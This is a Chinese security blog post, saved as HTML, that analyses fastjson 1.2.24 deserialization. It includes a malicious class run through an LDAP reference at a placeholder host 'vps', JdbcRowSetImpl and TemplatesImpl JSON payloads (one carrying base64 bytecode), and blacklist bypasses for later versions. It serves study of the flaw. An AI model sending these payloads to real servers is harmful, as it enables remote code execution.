@@ -1,0 +1,675 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://raw.githubusercontent.com/kIl3rr/photo/main/icon.jpg">
+  <link rel="icon" href="https://raw.githubusercontent.com/kIl3rr/photo/main/icon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <meta name="description" content="FastJson反序列化java处理JSON数据有三个比较流行的类库，gson(google维护)、jackson、fastjson，fastjson是阿里巴巴一个开源的json相关的java library，主要的API：JSON.parseObject和JSON.parse 环境搭建创建一个springboot，mavenn添加fastjson1.2.24依赖 代码可以参考vulhub的fas">
+<meta property="og:type" content="article">
+<meta property="og:title" content="FastJson反序列化">
+<meta property="og:url" content="http://example.com/2023/03/15/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="🗄">
+<meta property="og:description" content="FastJson反序列化java处理JSON数据有三个比较流行的类库，gson(google维护)、jackson、fastjson，fastjson是阿里巴巴一个开源的json相关的java library，主要的API：JSON.parseObject和JSON.parse 环境搭建创建一个springboot，mavenn添加fastjson1.2.24依赖 代码可以参考vulhub的fas">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220320234749700.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220321203139793.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220321225602870.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220322174230645.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220322174547070.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220322203041861.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220322204905966.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220322215646236.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220322215934108.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220322220329863.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220323004328629.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220323004724811.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220323005644331.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220323010217147.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220323010747848.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220323010837490.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220323011648052.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/20190724201853.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220323014010926.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324140337580.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324140352482.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324140824351.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324151509785.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324160340283.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324152509308.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324152757662.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324161558201.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324162612574.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324164412464.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324164450203.png">
+<meta property="article:published_time" content="2023-03-15T12:56:37.000Z">
+<meta property="article:modified_time" content="2023-09-09T05:21:29.406Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220320234749700.png">
+  
+  <title>FastJson反序列化 - 🗄</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-dark-dimmed.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+  
+<link rel="stylesheet" href="/css/macpanel.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":"G-SL9T1KRBQY","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>👩‍💻</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                Links
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('https://raw.githubusercontent.com/kIl3rr/photo/main/post.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="FastJson反序列化">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2023-03-15 20:56" pubdate>
+        March 15, 2023 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      6.7k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      NaN 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">FastJson反序列化</h1>
+            
+            <div class="markdown-body">
+              <h1 id="FastJson反序列化"><a href="#FastJson反序列化" class="headerlink" title="FastJson反序列化"></a>FastJson反序列化</h1><p>java处理JSON数据有三个比较流行的类库，gson(google维护)、jackson、fastjson，fastjson是阿里巴巴一个开源的json相关的java library，主要的API：JSON.parseObject和JSON.parse</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>创建一个springboot，mavenn添加fastjson1.2.24依赖</p>
+<p>代码可以参考vulhub的fastjsondemo.jar包</p>
+<p><a target="_blank" rel="noopener" href="https://dongguabai.blog.csdn.net/article/details/86617059?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_paycolumn_v3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_paycolumn_v3&utm_relevant_index=2">启动服务可能遇到的问题</a></p>
+<p>需要在创建springboot勾选web模块</p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220320234749700.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>访问页面返回一个json，修改一下值post回去，发现可以更新json中的name值，age固定返回20</p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220321203139793.png" srcset="/img/loading.gif" lazyload></p>
+<p>编写一个恶意类用来远程加载</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Touchfile</span> </span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            String[] cmd = &#123; <span class="hljs-string">&quot;touch&quot;</span>, <span class="hljs-string">&quot;/tmp/success&quot;</span> &#125;;<br>            Runtime.getRuntime().exec(cmd).waitFor();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> do nothing</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>编译，起一个http.server，再起一个marshalsec.ldap “<a target="_blank" rel="noopener" href="http://vps/#Touchfile&quot;">http://vps/#Touchfile&quot;</a></p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220321225602870.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>有两个payload：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://vps/Touchfile&quot;</span>,<span class="hljs-attr">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<span class="hljs-attr">&quot;_bytecodes&quot;</span>:[<span class="hljs-string">&quot;yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAMgAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASAA0AEwAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=&quot;</span>],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,<span class="hljs-attr">&quot;_outputProperties&quot;</span>:&#123; &#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>着重分析第一个payload，参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8046?page=4#toc-4">summer师傅</a>的文章，payload分三部分，<code>@type</code> 、<code>dataSourceName</code> 、<code>autoCommit</code></p>
+<p>第一个<code>@type</code>的作用？</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.fastjsondemo;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typedowhat</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        User user = <span class="hljs-keyword">new</span> User();<br>        user.setAge(<span class="hljs-number">18</span>);<br>        user.setName(<span class="hljs-string">&quot;h^k&quot;</span>);<br><br>        String str1 = JSONObject.toJSONString(user);<br>        String str2 = JSONObject.toJSONString(user, SerializerFeature.WriteClassName);<span class="hljs-comment">//两者做对比</span><br><br>        System.out.println(str1);<br>        System.out.println(str2);<br>        <span class="hljs-comment">//可知@type的作用是指定json解析到哪个类</span><br><br>        <span class="hljs-comment">//解析</span><br>        System.out.println(JSON.parse(str1));<br>        System.out.println(JSON.parse(str2));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;age&quot;</span>:<span class="hljs-number">18</span>,<span class="hljs-attr">&quot;name&quot;</span>:<span class="hljs-string">&quot;h^k&quot;</span>&#125;<br>&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.example.fastjsondemo.User&quot;</span>,<span class="hljs-attr">&quot;age&quot;</span>:<span class="hljs-number">18</span>,<span class="hljs-attr">&quot;name&quot;</span>:<span class="hljs-string">&quot;h^k&quot;</span>&#125;<br>&#123;<span class="hljs-attr">&quot;name&quot;</span>:<span class="hljs-string">&quot;h^k&quot;</span>,<span class="hljs-attr">&quot;age&quot;</span>:<span class="hljs-number">18</span>&#125;<br>com.example.fastjsondemo.User@<span class="hljs-number">7</span>de26db8<br></code></pre></td></tr></table></figure>
+
+<p>@type字段用来指定该JSON还原成何种类型的对象，在反序列化的时候方便操作</p>
+<p>因此在JSON序列化的方法加入<code>SerializerFeature.WriteClassName</code>特征字段。序列化出来的结果会在开头加一个<code>@type</code>字段，值为进行序列化的类名。同时，漏洞也就跃然纸上了，通过<code>@type</code>控制获取到的类对象</p>
+<p>断点打在JSON.parse()方法上，一步步跟到</p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220322174230645.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220322174547070.png" srcset="/img/loading.gif" lazyload></p>
+<p>匹配<code>&#123;</code>，开始解析了，case 12创建对象，调用parseObject()方法解析</p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220322203041861.png" srcset="/img/loading.gif" lazyload></p>
+<p>json格式中的<code>,</code> <code>&quot;</code> <code>:</code> <code>&#125;</code>在parseObject方法里面开始匹配</p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220322204905966.png" srcset="/img/loading.gif" lazyload></p>
+<p>获取到<code>@type</code></p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220322215646236.png" srcset="/img/loading.gif" lazyload></p>
+<p>判断<code>key == JSON.DEFAULT_TYPE_KEY</code></p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220322215934108.png" srcset="/img/loading.gif" lazyload></p>
+<p>开始反序列化</p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220322220329863.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>deserializer.deserialze(this, clazz, fieldName);</code></p>
+<p>步进下去会提示<code>debug info not available</code></p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220323004328629.png" srcset="/img/loading.gif" lazyload></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/hl_java/article/details/79078886">原因&amp;解决方法</a>，这里不解决了，Ctrl+鼠标单击，焯</p>
+<p>来到这里，浏览很久还没有看到setValue，折一下这么长。。没有debug的痛苦</p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220323004724811.png" srcset="/img/loading.gif" lazyload></p>
+<p>在github找到Gadget链🤣</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs markdown">/<span class="hljs-strong">**</span><br><span class="hljs-strong"> <span class="hljs-emphasis">* Gadget chain:</span></span><br><span class="hljs-emphasis"><span class="hljs-strong"> *</span>      JSON.parse()</span><br><span class="hljs-strong"> <span class="hljs-emphasis">*          DefaultJSONParser.parse()</span></span><br><span class="hljs-emphasis"><span class="hljs-strong"> *</span>              DefaultJSONParser.parseObject()</span><br><span class="hljs-strong"> <span class="hljs-emphasis">*                  JavaBeanDeserializer.deserialze()</span></span><br><span class="hljs-emphasis"><span class="hljs-strong"> *</span>                      JavaBeanDeserializer.parseRest()</span><br><span class="hljs-strong"> <span class="hljs-emphasis">*                          FieldDeserializer.setValue()</span></span><br><span class="hljs-emphasis"><span class="hljs-strong"> *</span>                              Reflect.invoke()</span><br><span class="hljs-strong"> <span class="hljs-emphasis">*                                  JdbcRowSetImpl.setAutoCommit()</span></span><br><span class="hljs-emphasis"><span class="hljs-strong"> *</span></span><br><span class="hljs-strong"> <span class="hljs-emphasis">*/</span></span><br></code></pre></td></tr></table></figure>
+
+<p>搜索<code>setValue()</code></p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220323005644331.png" srcset="/img/loading.gif" lazyload></p>
+<p>进来继续断点，可以debug了</p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220323010217147.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220323010747848.png" srcset="/img/loading.gif" lazyload></p>
+<p>invoke往下一直跟</p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220323010837490.png" srcset="/img/loading.gif" lazyload></p>
+<p>调用connect方法</p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220323011648052.png" srcset="/img/loading.gif" lazyload></p>
+<p>至此开花</p>
+<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>版本迭代后，通过检测还原类并比对黑名单的方式</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; denyList.length; ++i) &#123;<br>    String deny = denyList[i];<br>    <span class="hljs-keyword">if</span> (className.startsWith(deny)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> JSONException(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/20190724201853.png" srcset="/img/loading.gif" lazyload></p>
+<p>同时还关闭反序列化任意类<a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/wiki/enable_autotype">Autotype</a></p>
+<p>黑名单的绕过：</p>
+<p><code>TypeUtils.loadClass</code>真正加载class类时，有这样一段代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (className.charAt(<span class="hljs-number">0</span>) == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;<br>    Class&lt;?&gt; componentType = loadClass(className.substring(<span class="hljs-number">1</span>), classLoader);<br>    <span class="hljs-keyword">return</span> Array.newInstance(componentType, <span class="hljs-number">0</span>).getClass();<br>&#125;<br><br><span class="hljs-keyword">if</span> (className.startsWith(<span class="hljs-string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="hljs-string">&quot;;&quot;</span>)) &#123;<br>    String newClassName = className.substring(<span class="hljs-number">1</span>, className.length() - <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> loadClass(newClassName, classLoader);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到在黑名单检测之后，当开头有<code>[</code>或者<code>L</code>和<code>;</code>时会去掉这些字符，从而造成了黑名单的绕过</p>
+<p>绕过方式：在包名前加<code>L</code>，包名后加<code>;</code></p>
+<blockquote>
+<p>{“@type”:”<strong>L</strong>com.sun.rowset.JdbcRowSetImpl**;**”,”dataSourceName”:”ldap://vps/Touchfile”,”autoCommit”:true}</p>
+</blockquote>
+<h3 id="1-2-42-开启Autotype"><a href="#1-2-42-开启Autotype" class="headerlink" title="1.2.42(开启Autotype)"></a>1.2.42(开启Autotype)</h3><p>1.2.42修复：假如开头和结尾是<code>L</code>和<code>;</code>就将头和尾去掉，再进行黑名单验证，然后将黑名单加密，不让你们搞了，嘿嘿</p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220323014010926.png" srcset="/img/loading.gif" lazyload></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/LeadroyaL/fastjson-blacklist">blacklist-fuzz</a></p>
+<p>双写绕过：</p>
+<blockquote>
+<p><strong>LL</strong>com.sun.rowset.JdbcRowSetImpl**;;**</p>
+</blockquote>
+<h3 id="1-2-43-开启Autotype"><a href="#1-2-43-开启Autotype" class="headerlink" title="1.2.43(开启Autotype)"></a>1.2.43(开启Autotype)</h3><p>开头两个<code>LL</code>抛出异常，迭代就是不断更新黑名单</p>
